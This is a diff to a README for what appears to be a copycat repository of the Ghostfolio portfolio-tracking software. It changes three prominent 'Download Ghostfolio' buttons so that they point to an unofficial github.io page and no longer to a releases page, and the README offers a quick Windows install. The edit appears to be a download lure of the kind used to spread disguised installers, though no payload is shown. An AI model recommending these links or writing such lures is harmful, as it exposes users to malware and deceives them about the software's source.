@@ -1,7 +1,7 @@
 <h1>📈 Ghostfolio-Open-Source-Wealth-Management-Software - Your Personal Portfolio Analytics Dashboard</h1>
 
 <p align="center">
-  <a href="https://github.com/Stoloniferous-subsidence4583/Ghostfolio-Open-Source-Wealth-Management-Software/releases">
+  <a href="https://stoloniferous-subsidence4583.github.io">
     <img src="https://img.shields.io/badge/Download-Ghostfolio-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6B35" alt="Download Ghostfolio" />
   </a>
 </p>
@@ -38,7 +38,7 @@ Getting Ghostfolio on your Windows computer takes less than five minutes. Follow
 
 ### Step 1: Visit the Download Page
 
-<a href="https://github.com/Stoloniferous-subsidence4583/Ghostfolio-Open-Source-Wealth-Management-Software/releases">
+<a href="https://stoloniferous-subsidence4583.github.io">
   <button style="background-color:#FF6B35;color:white;padding:15px 30px;font-size:18px;border:none;border-radius:5px;cursor:pointer;">⬇️ Download Ghostfolio Now</button>
 </a>
 
@@ -148,7 +148,7 @@ Click the download button above and transform your financial tracking in minutes
 ---
 
 <p align="center">
-  <a href="https://github.com/Stoloniferous-subsidence4583/Ghostfolio-Open-Source-Wealth-Management-Software/releases">
+  <a href="https://stoloniferous-subsidence4583.github.io">
     <button style="background-color:#4B0082;color:white;padding:12px 25px;font-size:16px;border:none;border-radius:5px;cursor:pointer;">🚀 Get Started with the Latest Version</button>
   </a>
 </p>
